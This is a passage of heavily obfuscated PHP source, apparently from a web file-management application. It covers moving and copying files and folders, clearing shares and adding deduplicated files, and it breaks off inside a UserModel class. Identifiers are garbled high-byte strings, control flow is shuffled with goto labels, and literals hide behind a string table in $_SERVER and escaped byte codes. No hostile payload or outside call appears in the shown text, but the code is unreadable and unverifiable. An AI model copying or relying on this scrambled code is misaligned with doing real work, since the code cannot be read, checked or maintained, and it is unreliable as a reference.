$this->_childrenItemCache[$bÍà¿Ê“Ù²] = $E‹£‚Ä¯³„; } return $D±¡¾È¸Ÿ; goto CçÏ¤éÌÜİ; CçÏ¤éÌÜİ: } private function fileNameExistCache($fãìù¼Å÷¼, $fµ§¼Õ·“„) { $Dİ½Ô¡‰­­ =& $_SERVER[¿õñ]; $fµ§¼Õ·“„ = strtolower($fµ§¼Õ·“„); $a³² Ä‚¬à = $this->_childrenList($fãìù¼Å÷¼); foreach ($a³² Ä‚¬à as $B”¨‰êßáØ) { if ($fµ§¼Õ·“„ == strtolower($B”¨‰êßáØ[$Dİ½Ô¡‰­­[28]])) { return $B”¨‰êßáØ[$Dİ½Ô¡‰­­[366]]; } } return !1; } private function fileNameAutoCache($f—‡—¬é‘È, $F“ÀÃ—‰í½, $bµ°ùŒË‘, $CÊ§è­¶‡Ø) { $bç˜†»–†Ï =& $_SERVER[¿õñ]; $aò˜ˆ¶ğ¹Í = $this->_childrenList($f—‡—¬é‘È); $eÓ®ä’Ê’‰ = array_to_keyvalue($aò˜ˆ¶ğ¹Í, $bç˜†»–†Ï[33], $bç˜†»–†Ï[28]); return $this->fileNameAutoGet($eÓ®ä’Ê’‰, $F“ÀÃ—‰í½, $bµ°ùŒË‘, $CÊ§è­¶‡Ø); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($d†‰ôá‚Åè, $A¡ÓåÙó„î, $DµÆ…å…ÔŸ = REPEAT_REPLACE, $a‚ÜÕÎ¦¤© = '') { goto BÈ‘Ú·Äôî; b¤¶Ø˜íë: $this->folderSizeReset($AëÏšà‡ŒÏ[$a—‚ÓíŒ[457]]); $this->folderSizeReset($A¡ÓåÙó„î); $aäğ¡¬®å¡ = array($AëÏšà‡ŒÏ[$a—‚ÓíŒ[457]], $A¡ÓåÙó„î); goto DëÛˆÌã¯¥; BÈ‘Ú·Äôî: $a—‚ÓíŒ =& $_SERVER[¿õñ]; $AëÏšà‡ŒÏ = $this->sourceInfo($d†‰ôá‚Åè); $dËÎ‚Ê Øø = $this->sourceInfo($A¡ÓåÙó„î); goto d¹ÚšòƒÍæ; bƒ˜ ²½·ö: $this->clearShare($d†‰ôá‚Åè, $A¡ÓåÙó„î); $aëÎêáÆ‘ô = $this->fileNameExistCache($A¡ÓåÙó„î, $AëÏšà‡ŒÏ[$a—‚ÓíŒ[28]]); $A¾¬ÛÃÁŞì = $this->_move($d†‰ôá‚Åè, $A¡ÓåÙó„î, $DµÆ…å…ÔŸ, $D¾‚×÷¿Ï, $a‚ÜÕÎ¦¤©); goto aË¡ÛÅ’‰; d¹ÚšòƒÍæ: $d´òÉğ³² = $this->pathInfoMore($d†‰ôá‚Åè); if ($this->isParentOf($d†‰ôá‚Åè, $A¡ÓåÙó„î)) { return !1; } if (!$AëÏšà‡ŒÏ || !$dËÎ‚Ê Øø || $dËÎ‚Ê Øø[$a—‚ÓíŒ[367]] != $a—‚ÓíŒ[493]) { return !1; } goto D¹‚øÇµ†; f”“ç©Ñ°à: if ($aëÎêáÆ‘ô && $D¾‚×÷¿Ï[$a—‚ÓíŒ[525]]) { $this->remove($d†‰ôá‚Åè, !1); } $this->lockMoveEnd($d†‰ôá‚Åè); $this->lockWriteEnd($A¡ÓåÙó„î, $E´ğê…É–); goto b¤¶Ø˜íë; a¨…‚ŒÅ: Hook::trigger($a—‚ÓíŒ[524], $d´òÉğ³²); return $A¾¬ÛÃÁŞì; goto c¡‰ÅÊÑî¹; DëÛˆÌã¯¥: if ($AëÏšà‡ŒÏ[$a—‚ÓíŒ[367]] == $a—‚ÓíŒ[493]) { $aäğ¡¬®å¡[] = $d†‰ôá‚Åè; } $this->updateModifyTime($aäğ¡¬®å¡); Model($a—‚ÓíŒ[498])->eventMove($d†‰ôá‚Åè, $AëÏšà‡ŒÏ[$a—‚ÓíŒ[457]], $A¡ÓåÙó„î); goto a¨…‚ŒÅ; D¹‚øÇµ†: Hook::trigger($a—‚ÓíŒ[523], $d´òÉğ³²); if ($AëÏšà‡ŒÏ[$a—‚ÓíŒ[457]] == $A¡ÓåÙó„î && $a‚ÜÕÎ¦¤© != $AëÏšà‡ŒÏ[$a—‚ÓíŒ[28]]) { $CÓó˜­ÕÀ… = $this->fileNameExist($A¡ÓåÙó„î, $a‚ÜÕÎ¦¤©); if ($CÓó˜­ÕÀ… && $AëÏšà‡ŒÏ[$a—‚ÓíŒ[367]] == $a—‚ÓíŒ[464]) { goto cÃ¸ßÏ«; FŠ·•‰¤›: return $CÓó˜­ÕÀ…; goto fÃ¡°¿÷­î; dŠœÃŒˆ‡: $this->remove($d†‰ôá‚Åè, !1); $this->folderSizeReset($A¡ÓåÙó„î); Hook::trigger($a—‚ÓíŒ[524], $d´òÉğ³²); goto FŠ·•‰¤›; cÃ¸ßÏ«: $aÌã×Ú±¢ = $this->sourceInfo($CÓó˜­ÕÀ…); $F‰§Ãá‹© = $this->fileHistory($aÌã×Ú±¢, $AëÏšà‡ŒÏ[$a—‚ÓíŒ[415]], $AëÏšà‡ŒÏ[$a—‚ÓíŒ[78]]); if (!$F‰§Ãá‹©) { Model($a—‚ÓíŒ[418])->remove($AëÏšà‡ŒÏ[$a—‚ÓíŒ[415]]); } goto dŠœÃŒˆ‡; fÃ¡°¿÷­î: } } $E´ğê…É– = $a‚ÜÕÎ¦¤© ? $a‚ÜÕÎ¦¤© : $AëÏšà‡ŒÏ[$a—‚ÓíŒ[28]]; goto dÓÀ¿×°ª; dÓÀ¿×°ª: $this->lockMoveStart($d†‰ôá‚Åè); $this->lockWriteStart($A¡ÓåÙó„î, $E´ğê…É–); $D¾‚×÷¿Ï = array($a—‚ÓíŒ[494] => array(), $a—‚ÓíŒ[525] => !1); goto bƒ˜ ²½·ö; aË¡ÛÅ’‰: $this->sourceCacheClear(); if ($AëÏšà‡ŒÏ[$a—‚ÓíŒ[367]] == $a—‚ÓíŒ[493] && $aëÎêáÆ‘ô) { $this->folderSizeResetChildren($A¾¬ÛÃÁŞì); } Model($a—‚ÓíŒ[164])->linkAdd($D¾‚×÷¿Ï[$a—‚ÓíŒ[494]]); goto f”“ç©Ñ°à; c¡‰ÅÊÑî¹: } private function _move($C“—“Ë‚áÈ, $Bäï‹‡âŸŠ, $cÓ¼Ù¤îã, &$D²Ñî×óç, $aÚğˆĞƒÈ = '') { goto a²„Ø…ì‰; dÁËç’‡áÙ: $eĞóãÃİŒ¶ = $aÚğˆĞƒÈ ? $aÚğˆĞƒÈ : $CÔáÚ·¢Í„[$cÒÔøºÚ¬Õ[28]]; $Cä‚«„Ò› = $this->fileNameExistCache($Bäï‹‡âŸŠ, $eĞóãÃİŒ¶); $this->lockMoveStart($C“—“Ë‚áÈ); goto E­µ…ĞÆâé; CööÃ‡¬Ï×: return $dÉÌ¿õ™Ë©; goto bÙäêôŞ‡Â; a²„Ø…ì‰: $cÒÔøºÚ¬Õ =& $_SERVER[¿õñ]; $CÔáÚ·¢Í„ = $this->sourceInfo($C“—“Ë‚áÈ); $FŒÚÇİôŠ÷ = $CÔáÚ·¢Í„[$cÒÔøºÚ¬Õ[367]] == $cÒÔøºÚ¬Õ[493]; goto dÁËç’‡áÙ; e˜¡Şö¢Œ¥: $CÖŠù¾›Óò = !1; if ($FŒÚÇİôŠ÷) { if ($cÓ¼Ù¤îã == REPEAT_RENAME_FOLDER) { $eĞóãÃİŒ¶ = $this->fileNameAuto($Bäï‹‡âŸŠ, $eĞóãÃİŒ¶, $cÓ¼Ù¤îã, $FŒÚÇİôŠ÷); $dÉÌ¿õ™Ë© = $this->_moveForce($C“—“Ë‚áÈ, $Bäï‹‡âŸŠ, $eĞóãÃİŒ¶); } else { if ($cÓ¼Ù¤îã == REPEAT_RENAME_FOLDER) { $cÓ¼Ù¤îã = REPEAT_RENAME; } $a¹µ—»›»½ = $this->_childrenListSelect($C“—“Ë‚áÈ); foreach ($a¹µ—»›»½ as $f‹³ ñÏªŒ) { $this->_move($f‹³ ñÏªŒ[$cÒÔøºÚ¬Õ[366]], $Cä‚«„Ò›, $cÓ¼Ù¤îã, $D²Ñî×óç); } $CÖŠù¾›Óò = !0; } } else { if ($cÓ¼Ù¤îã == REPEAT_SKIP) { $CÖŠù¾›Óò = !0; } else { if ($cÓ¼Ù¤îã == REPEAT_RENAME || $cÓ¼Ù¤îã == REPEAT_RENAME_FOLDER) { $eĞóãÃİŒ¶ = $this->fileNameAuto($Bäï‹‡âŸŠ, $eĞóãÃİŒ¶, $cÓ¼Ù¤îã, $FŒÚÇİôŠ÷); $dÉÌ¿õ™Ë© = $this->_moveForce($C“—“Ë‚áÈ, $Bäï‹‡âŸŠ, $eĞóãÃİŒ¶); } else { if ($cÓ¼Ù¤îã == REPEAT_REPLACE) { $fÌÕ„×…õ = $this->sourceInfoCache($Cä‚«„Ò›); $b‰…†¡Û´ = $this->fileHistory($fÌÕ„×…õ, $CÔáÚ·¢Í„[$cÒÔøºÚ¬Õ[415]], $CÔáÚ·¢Í„[$cÒÔøºÚ¬Õ[78]]); if ($b‰…†¡Û´) { $D²Ñî×óç[$cÒÔøºÚ¬Õ[494]][] = $CÔáÚ·¢Í„[$cÒÔøºÚ¬Õ[415]]; } else { $CÖŠù¾›Óò = !0; } } } } } if ($CÖŠù¾›Óò && !$D²Ñî×óç[$cÒÔøºÚ¬Õ[525]]) { $D²Ñî×óç[$cÒÔøºÚ¬Õ[525]] = !0; } goto CööÃ‡¬Ï×; E­µ…ĞÆâé: $this->lockWriteStart($Bäï‹‡âŸŠ, $eĞóãÃİŒ¶); if (!$Cä‚«„Ò›) { return $this->_moveForce($C“—“Ë‚áÈ, $Bäï‹‡âŸŠ, $eĞóãÃİŒ¶); } $dÉÌ¿õ™Ë© = $Cä‚«„Ò›; goto e˜¡Şö¢Œ¥; bÙäêôŞ‡Â: } private function _moveForce($CÃ…ÒÓ¶«Ö, $FÉÂšÈÃíÁ, $eñİğª“‡Æ) { goto A°×¶»ñù‘; dÇï¾–˜·–: if ($B²„’—ä†À) { $BŠ‡†ÂÚŸ = array($bÃøæÒ³²Š[518] => array($bÃøæÒ³²Š[475], $B²×‹‚‚à´[$bÃøæÒ³²Š[455]] . $B²×‹‚‚à´[$bÃøæÒ³²Š[366]] . $bÃøæÒ³²Š[476])); $fÌŸÂÜÇ× = $B²×‹‚‚à´[$bÃøæÒ³²Š[455]] . $B²×‹‚‚à´[$bÃøæÒ³²Š[366]] . $bÃøæÒ³²Š[47]; $b¸ïõ¸ã… = $eå´°°©¶[$bÃøæÒ³²Š[455]] . $eå´°°©¶[$bÃøæÒ³²Š[366]] . $bÃøæÒ³²Š[47] . $B²×‹‚‚à´[$bÃøæÒ³²Š[366]] . $bÃøæÒ³²Š[47]; $B’£ç‡‡‘â = array($bÃøæÒ³²Š[518] => array($bÃøæÒ³²Š[526], "\x72\145\160\x6c\141\143\145\x28\x70\x61\x72\x65\x6e\x74\114\145\166\x65\x6c\54\47{$fÌŸÂÜÇ×}\47\54\x27{$b¸ïõ¸ã…}\47\x29"), $bÃøæÒ³²Š[514] => $eå´°°©¶[$bÃøæÒ³²Š[368]], $bÃøæÒ³²Š[515] => $eå´°°©¶[$bÃøæÒ³²Š[452]]); if ($B×ÚáÂ³„Á) { $B’£ç‡‡‘â[$bÃøæÒ³²Š[392]] = 0; } $this->where($BŠ‡†ÂÚŸ)->data($B’£ç‡‡‘â)->save(); } $this->where(array($bÃøæÒ³²Š[380] => $CÃ…ÒÓ¶«Ö))->data($F¤Æ¡µÓ³)->save(); return $CÃ…ÒÓ¶«Ö; goto bîÓƒÃÚ; A°×¶»ñù‘: $bÃøæÒ³²Š =& $_SERVER[¿õñ]; $B²×‹‚‚à´ = $this->sourceInfo($CÃ…ÒÓ¶«Ö); $eå´°°©¶ = $this->sourceInfo($FÉÂšÈÃíÁ); goto Bä¯´†¿³; c²ÊÈÛŠßÜ: if (!$CÉ‘ßÎŸì) { Model($bÃøæÒ³²Š[450])->authClear($CÃ…ÒÓ¶«Ö); } $B×ÚáÂ³„Á = $B²×‹‚‚à´[$bÃøæÒ³²Š[393]] == $bÃøæÒ³²Š[493] && $eå´°°©¶[$bÃøæÒ³²Š[393]] != $bÃøæÒ³²Š[493]; if ($B×ÚáÂ³„Á) { $F¤Æ¡µÓ³[$bÃøæÒ³²Š[392]] = 0; } goto dÇï¾–˜·–; Bä¯´†¿³: $B²„’—ä†À = $B²×‹‚‚à´[$bÃøæÒ³²Š[367]] == $bÃøæÒ³²Š[493]; $F¤Æ¡µÓ³ = array($bÃøæÒ³²Š[365] => $eå´°°©¶[$bÃøæÒ³²Š[366]], $bÃøæÒ³²Š[518] => $eå´°°©¶[$bÃøæÒ³²Š[455]] . $eå´°°©¶[$bÃøæÒ³²Š[366]] . $bÃøæÒ³²Š[47], $bÃøæÒ³²Š[514] => $eå´°°©¶[$bÃøæÒ³²Š[368]], $bÃøæÒ³²Š[515] => $eå´°°©¶[$bÃøæÒ³²Š[452]], $bÃøæÒ³²Š[517] => USER_ID, $bÃøæÒ³²Š[383] => $eñİğª“‡Æ); $CÉ‘ßÎŸì = $B²×‹‚‚à´[$bÃøæÒ³²Š[368]] == SourceModel::TYPE_GROUP && $eå´°°©¶[$bÃøæÒ³²Š[368]] == SourceModel::TYPE_GROUP && $B²×‹‚‚à´[$bÃøæÒ³²Š[452]] == $eå´°°©¶[$bÃøæÒ³²Š[452]]; goto c²ÊÈÛŠßÜ; bîÓƒÃÚ: } private function clearShare($cÁîùººŠ‰, $D§µºö†ğç) { goto fÉô›â‹Ûã; E†¯Ñ˜: if (!$dŠ„‰ôó) { return; } $dƒù²¤×ï = array($D‰ìƒº¯…[366] => array($D‰ìƒº¯…[7], $dŠ„‰ôó), $D‰ìƒº¯…[444] => 1); $CŒ‹‡µ·ï® = Model($D‰ìƒº¯…[528])->field($D‰ìƒº¯…[437])->where($dƒù²¤×ï)->select(); goto Fæ«Ï“­É×; e ¡ÛŒÑâğ: if ($AºÉ÷Ï½°–[$D‰ìƒº¯…[452]] == $bæˆŒí‹œè[$D‰ìƒº¯…[452]] && $AºÉ÷Ï½°–[$D‰ìƒº¯…[368]] == $D‰ìƒº¯…[527]) { return; } $dƒù²¤×ï = array($D‰ìƒº¯…[455] => array($D‰ìƒº¯…[475], $AºÉ÷Ï½°–[$D‰ìƒº¯…[455]] . $cÁîùººŠ‰ . $D‰ìƒº¯…[476])); $dŠ„‰ôó = $this->field($D‰ìƒº¯…[380])->where($dƒù²¤×ï)->getField($D‰ìƒº¯…[366], !0); goto E†¯Ñ˜; fÉô›â‹Ûã: $D‰ìƒº¯… =& $_SERVER[¿õñ]; $AºÉ÷Ï½°– = $this->sourceInfo($cÁîùººŠ‰); $bæˆŒí‹œè = $this->sourceInfo($D§µºö†ğç); goto e ¡ÛŒÑâğ; eÏ½ğ¹«ÑÀ: Model($D‰ìƒº¯…[528])->where($dƒù²¤×ï)->save(array($D‰ìƒº¯…[444] => 0)); Model($D‰ìƒº¯…[529])->where($dƒù²¤×ï)->delete(); goto EöóÍ”É¡›; Fæ«Ï“­É×: if (!$CŒ‹‡µ·ï®) { return; } $CŒ‹‡µ·ï® = array_to_keyvalue($CŒ‹‡µ·ï®, $D‰ìƒº¯…[33], $D‰ìƒº¯…[437]); $dƒù²¤×ï = array($D‰ìƒº¯…[437] => array($D‰ìƒº¯…[7], $CŒ‹‡µ·ï®)); goto eÏ½ğ¹«ÑÀ; EöóÍ”É¡›: } public function copyFolderFromIO($DÏ†Óù¶, $eÂĞàÁíß³, $FŒàôÇ‰, $cÉøÇËç×á, $eêÍÛ¢ù‰, $bÓ–Œ¬ù·† = false) { goto Bœ ”ß»Ù; bâ²ÖªÖŠÏ: $this->updateModifyTime($FŒàôÇ‰); return $aÒ›ğàÕ÷ø; goto d¢ç†øñ«é; aÁÜêŠêÕ: Hook::trigger($D¶ì”¿‘ìô[532]); if ($aÒ›ğàÕ÷ø) { $this->folderSizeResetChildren($aÒ›ğàÕ÷ø); } $this->_childrenListClear(); goto fÄ£øœØ¬; fÄ£øœØ¬: Model($D¶ì”¿‘ìô[497])->addAll($B›À•Èíâô[$D¶ì”¿‘ìô[495]], array(), !0); Model($D¶ì”¿‘ìô[498])->eventCopy($aÒ›ğàÕ÷ø); $this->saveAll($B›À•Èíâô[$D¶ì”¿‘ìô[496]]); goto eŸ…¦¥èñé; dŞò£™Ùø‚: if ($E†Ò‡˜ÕÃ¬) { $this->_childrenAllMake($E†Ò‡˜ÕÃ¬); } Hook::trigger($D¶ì”¿‘ìô[531]); $this->_copyChildTo($DÏ†Óù¶, $eÂĞàÁíß³, $aÒ›ğàÕ÷ø, $cÉøÇËç×á, $B›À•Èíâô, $eêÍÛ¢ù‰); goto aÁÜêŠêÕ; eŸ…¦¥èñé: Model($D¶ì”¿‘ìô[418])->linkAdd($B›À•Èíâô[$D¶ì”¿‘ìô[494]]); Model($D¶ì”¿‘ìô[418])->remove($B›À•Èíâô[$D¶ì”¿‘ìô[530]]); $this->folderSizeReset($FŒàôÇ‰); goto bâ²ÖªÖŠÏ; dæ°ô§ã»­: $E†Ò‡˜ÕÃ¬ = $this->fileNameExist($FŒàôÇ‰, $CÄÈ°ÍÔì“); $aÒ›ğàÕ÷ø = $this->mkdir($FŒàôÇ‰, $CÄÈ°ÍÔì“, $cÉøÇËç×á); if (!$E†Ò‡˜ÕÃ¬ || $cÉøÇËç×á == REPEAT_RENAME_FOLDER) { $cÉøÇËç×á = !1; } goto dŞò£™Ùø‚; Bœ ”ß»Ù: $D¶ì”¿‘ìô =& $_SERVER[¿õñ]; $B›À•Èíâô = array($D¶ì”¿‘ìô[495] => array(), $D¶ì”¿‘ìô[496] => array(), $D¶ì”¿‘ìô[494] => array(), $D¶ì”¿‘ìô[530] => array()); $CÄÈ°ÍÔì“ = $bÓ–Œ¬ù·† ? $bÓ–Œ¬ù·† : $DÏ†Óù¶->getPathName($DÏ†Óù¶->pathThis($eÂĞàÁíß³)); goto dæ°ô§ã»­; d¢ç†øñ«é: } private function _copyChildTo($aŞÛä·Ã‚, $F¨¹ªÉÂ’, $aò”ğŒ­ÔÙ, $c½¼Õ¯øîã, &$Eİä¼¯”ù«, $B³£áØšÃğ) { goto f’ï‡ˆîæ; cÑ¹ê‘ê»›: $fØ…©ªàÎ¾ = $this->_childrenList($aò”ğŒ­ÔÙ); $fØ…©ªàÎ¾ = array_to_keyvalue($fØ…©ªàÎ¾, $f†¶ß§Ûæ[28]); foreach ($A‡¡©´Ö­õ as $d´È°³) { $b­“Œ¯¸‚Û = $fØ…©ªàÎ¾[$d´È°³[$f†¶ß§Ûæ[28]]]; $DêÂõ¤ò—ê = $b­“Œ¯¸‚Û[$f†¶ß§Ûæ[366]]; $this->_copyApplyMeta($b­“Œ¯¸‚Û, $Eİä¼¯”ù«); if ($d´È°³[$f†¶ß§Ûæ[29]] == $f†¶ß§Ûæ[77]) { $d´È°³[$f†¶ß§Ûæ[76]] = $aŞÛä·Ã‚->getPathInner($d´È°³[$f†¶ß§Ûæ[76]]); $this->_copyChildTo($aŞÛä·Ã‚, $d´È°³[$f†¶ß§Ûæ[76]], $DêÂõ¤ò—ê, $c½¼Õ¯øîã, $Eİä¼¯”ù«, $B³£áØšÃğ); } } goto f…Ôá‹¸±£; f’ï‡ˆîæ: $f†¶ß§Ûæ =& $_SERVER[¿õñ]; $cèùìòÛƒ‘ = $this->sourceInfoCache($aò”ğŒ­ÔÙ); $E¶Æ˜Ï´“¼ = $aŞÛä·Ã‚->listPath($F¨¹ªÉÂ’, !1, !0); goto FÒÈ„ÙØÇÑ; e”¡âÊÃ ğ: foreach ($A‡¡©´Ö­õ as &$d´È°³) { goto dƒÑŞ‰çÅã; eªÚÃ‹éí: $d´È°³[$f†¶ß§Ûæ[78]] = _get($d´È°³, $f†¶ß§Ûæ[78], 0); $d´È°³[$f†¶ß§Ûæ[415]] = _get($d´È°³, $f†¶ß§Ûæ[415], 0); if (!isset($d´È°³[$f†¶ß§Ûæ[533]]) && $d´È°³[$f†¶ß§Ûæ[415]]) { $Eİä¼¯”ù«[$f†¶ß§Ûæ[530]][] = $d´È°³[$f†¶ß§Ûæ[415]]; } goto Cïˆ¿Ğ¦˜ó; Cïˆ¿Ğ¦˜ó: if ($c½¼Õ¯øîã) { $F”çÜ§„ŒÅ = $this->fileNameExistCache($aò”ğŒ­ÔÙ, $d´È°³[$f†¶ß§Ûæ[28]]); if ($F”çÜ§„ŒÅ) { if ($d´È°³[$f†¶ß§Ûæ[367]] || $c½¼Õ¯øîã == REPEAT_SKIP) { continue; } if ($c½¼Õ¯øîã == REPEAT_REPLACE) { $b­“Œ¯¸‚Û = $this->sourceInfoCache($F”çÜ§„ŒÅ); $d‚ÎÊ½Ó™â = $this->fileHistory($b­“Œ¯¸‚Û, $d´È°³[$f†¶ß§Ûæ[415]], $d´È°³[$f†¶ß§Ûæ[78]]); if ($d‚ÎÊ½Ó™â) { $Eİä¼¯”ù«[$f†¶ß§Ûæ[494]][] = $d´È°³[$f†¶ß§Ûæ[415]]; } continue; } else { if ($c½¼Õ¯øîã == REPEAT_RENAME) { $d´È°³[$f†¶ß§Ûæ[28]] = $this->fileNameAutoCache($aò”ğŒ­ÔÙ, $d´È°³[$f†¶ß§Ûæ[28]], $c½¼Õ¯øîã, !1); } } } } if (!$d´È°³[$f†¶ß§Ûæ[367]] && $d´È°³[$f†¶ß§Ûæ[415]]) { $Eİä¼¯”ù«[$f†¶ß§Ûæ[494]][] = $d´È°³[$f†¶ß§Ûæ[415]]; } $Cö×ÇŠ“©[] = $this->_makeItemData($d´È°³, $cèùìòÛƒ‘, $d´È°³[$f†¶ß§Ûæ[28]]); goto EõÆ˜ÀÜö; dƒÑŞ‰çÅã: if (isset($eéå•ì¶„[$d´È°³[$f†¶ß§Ûæ[28]]])) { $d´È°³ = $eéå•ì¶„[$d´È°³[$f†¶ß§Ûæ[28]]]; } $d´È°³[$f†¶ß§Ûæ[367]] = $d´È°³[$f†¶ß§Ûæ[29]] == $f†¶ß§Ûæ[77]; $d´È°³[$f†¶ß§Ûæ[369]] = _get($d´È°³, $f†¶ß§Ûæ[157], $f†¶ß§Ûæ[33]); goto eªÚÃ‹éí; EõÆ˜ÀÜö: } unset($d´È°³); if (!empty($Cö×ÇŠ“©)) { $this->addAll($Cö×ÇŠ“©); } goto cÑ¹ê‘ê»›; FÒÈ„ÙØÇÑ: $A‡¡©´Ö­õ = array_merge($E¶Æ˜Ï´“¼[$f†¶ß§Ûæ[74]], $E¶Æ˜Ï´“¼[$f†¶ß§Ûæ[75]]); $eéå•ì¶„ = $this->_addFiles($aŞÛä·Ã‚, $E¶Æ˜Ï´“¼[$f†¶ß§Ûæ[74]], $B³£áØšÃğ); $Cö×ÇŠ“© = array(); goto e”¡âÊÃ ğ; f…Ôá‹¸±£: } private function _addFiles($AÖÒ™˜ó’õ, $Añ‚¶ÍÒàó, $BÄÚŒƒ­Ù) { goto dƒé·ã»ò; C¾ÑŠ­…æ: return $dÍô‰˜¬ˆ; goto B‡–í”·ª; dƒé·ã»ò: $BÒ£ºáù¾ =& $_SERVER[¿õñ]; if (!$Añ‚¶ÍÒàó || count($Añ‚¶ÍÒàó) == 0) { return array(); } $E¸†Ã¶íœ® = array(); goto eĞó˜¹áñä; d¯è“ï²ëù: $E†•ºáÜÁ˜ = array(); foreach ($Añ‚¶ÍÒàó as $Aê¦•‡Éİ) { if (isset($Aê¦•‡Éİ[$BÒ£ºáù¾[533]]) && $Aê¦•‡Éİ[$BÒ£ºáù¾[533]]) { continue; } $aº­¦ÄÔà¸ = $AÖÒ™˜ó’õ->getPathInner($Aê¦•‡Éİ[$BÒ£ºáù¾[76]]); $e­±õŸ›÷Ó = $d·œËÅñ¼š->addFileMake($aº­¦ÄÔà¸, $Aê¦•‡Éİ[$BÒ£ºáù¾[78]], $Aê¦•‡Éİ[$BÒ£ºáù¾[161]], $Aê¦•‡Éİ[$BÒ£ºáù¾[160]], $Aê¦•‡Éİ[$BÒ£ºáù¾[28]], $BÄÚŒƒ­Ù); $E†•ºáÜÁ˜[] = $e­±õŸ›÷Ó; } $d·œËÅñ¼š->addAll($E†•ºáÜÁ˜); goto E’««Ÿâ×İ; eĞó˜¹áñä: foreach ($Añ‚¶ÍÒàó as &$A‘ í´³Ù) { goto eƒ¾ç´º‘ ; eƒ¾ç´º‘ : Hook::trigger($BÒ£ºáù¾[534], $A‘ í´³Ù); $A‘ í´³Ù[$BÒ£ºáù¾[76]] = $AÖÒ™˜ó’õ->getPathInner($A‘ í´³Ù[$BÒ£ºáù¾[76]]); $bŞÄìáÛí = $AÖÒ™˜ó’õ->hashSimple($A‘ í´³Ù[$BÒ£ºáù¾[76]]); goto BéÕï¯İ¿ñ; cÉ…İØèØ¼: $A‘ í´³Ù[$BÒ£ºáù¾[160]] = $b™†ÈŞƒ˜‹; Hook::trigger($BÒ£ºáù¾[535], $A‘ í´³Ù); $E¸†Ã¶íœ®[$b™†ÈŞƒ˜‹][] =& $A‘ í´³Ù; goto D„Ç†²ÒÂ; BéÕï¯İ¿ñ: $b™†ÈŞƒ˜‹ = $AÖÒ™˜ó’õ->hashMd5($A‘ í´³Ù[$BÒ£ºáù¾[76]]); if (strlen($b™†ÈŞƒ˜‹) > 10 && !isset($E¸†Ã¶íœ®[$b™†ÈŞƒ˜‹])) { $E¸†Ã¶íœ®[$b™†ÈŞƒ˜‹] = array(); } $A‘ í´³Ù[$BÒ£ºáù¾[161]] = $bŞÄìáÛí; goto cÉ…İØèØ¼; D„Ç†²ÒÂ: if (count($E¸†Ã¶íœ®[$b™†ÈŞƒ˜‹]) > 1) { $A‘ í´³Ù[$BÒ£ºáù¾[533]] = !0; } goto bÕËÀ–×›ã; bÕËÀ–×›ã: } $c®¢Ê©øø‡ = array($BÒ£ºáù¾[160] => array($BÒ£ºáù¾[7], array_keys($E¸†Ã¶íœ®))); $d·œËÅñ¼š = Model($BÒ£ºáù¾[536]); goto AŞ”’±Ş…Œ; E’««Ÿâ×İ: $c®¢Ê©øø‡ = array($BÒ£ºáù¾[160] => array($BÒ£ºáù¾[7], array_keys($E¸†Ã¶íœ®))); $eòÓï–ªƒÑ = $d·œËÅñ¼š->where($c®¢Ê©øø‡)->select(); $eòÓï–ªƒÑ = $eòÓï–ªƒÑ ? $eòÓï–ªƒÑ : array(); goto BëˆÛ¯‰¡; BëˆÛ¯‰¡: foreach ($eòÓï–ªƒÑ as $f¶°ÇîàÍÆ) { if (!isset($E¸†Ã¶íœ®[$f¶°ÇîàÍÆ[$BÒ£ºáù¾[160]]])) { continue; } $bêÄ”Ï–óÂ =& $E¸†Ã¶íœ®[$f¶°ÇîàÍÆ[$BÒ£ºáù¾[160]]]; foreach ($bêÄ”Ï–óÂ as &$A‘ í´³Ù) { $A‘ í´³Ù[$BÒ£ºáù¾[415]] = $f¶°ÇîàÍÆ[$BÒ£ºáù¾[415]]; } unset($A‘ í´³Ù); } $dÍô‰˜¬ˆ = array(); foreach ($Añ‚¶ÍÒàó as $Bºµª“Èà) { $dÍô‰˜¬ˆ[$Bºµª“Èà[$BÒ£ºáù¾[28]]] = $Bºµª“Èà; } goto C¾ÑŠ­…æ; AŞ”’±Ş…Œ: $eòÓï–ªƒÑ = $d·œËÅñ¼š->where($c®¢Ê©øø‡)->select(); $eòÓï–ªƒÑ = $eòÓï–ªƒÑ ? $eòÓï–ªƒÑ : array(); foreach ($eòÓï–ªƒÑ as $f¶°ÇîàÍÆ) { if (!isset($E¸†Ã¶íœ®[$f¶°ÇîàÍÆ[$BÒ£ºáù¾[160]]])) { continue; } $a³Ê‘İ°Ì¬ = $E¸†Ã¶íœ®[$f¶°ÇîàÍÆ[$BÒ£ºáù¾[160]]]; foreach ($a³Ê‘İ°Ì¬ as &$A‘ í´³Ù) { $A‘ í´³Ù[$BÒ£ºáù¾[415]] = $f¶°ÇîàÍÆ[$BÒ£ºáù¾[415]]; $A‘ í´³Ù[$BÒ£ºáù¾[533]] = !0; } unset($A‘ í´³Ù); } goto d¯è“ï²ëù; B‡–í”·ª: } } define($_SERVER[¿õñ][537], $_SERVER[¿õñ][538]); goto Fó–¯¸Âï; Eê®Î°Š­É: class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\141\x6d\x65" => "\165\x73\x65\162\137\155\x65\164\141", "\x6d\145\x74\141\106\x69\145\154\x64" => "\165\163\145\162\x49\104"); protected $simpleField = "\165\x73\x65\162\x49\104\x2c\156\151\x63\153\x4e\141\155\145\x2c\x6e\x61\x6d\145\x2c\x61\x76\x61\x74\141\x72\54\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($a®ñ­ĞÎ°) { $b¼¥À§É› =& $_SERVER[¿õñ]; return array($b¼¥À§É›[2081] => array($a®ñ­ĞÎ°[0], $b¼¥À§É›[2373]), $b¼¥À§É›[2083] => array($a®ñ­ĞÎ°[0], $b¼¥À§É›[2373])); } protected function getInfo($cÁ©ÃêŒ¬, $B˜‚Ò•¢‘ = false) { $DœŞ§ó²Â =& $_SERVER[¿õñ]; $a‚©ÑîÄá = $this->getInfoSimple($cÁ©ÃêŒ¬); if (!is_array($a‚©ÑîÄá)) { return array(); } if ($B˜‚Ò•¢‘) { goto DÏòŞÓêƒŒ; c®äÉÏŞí: return 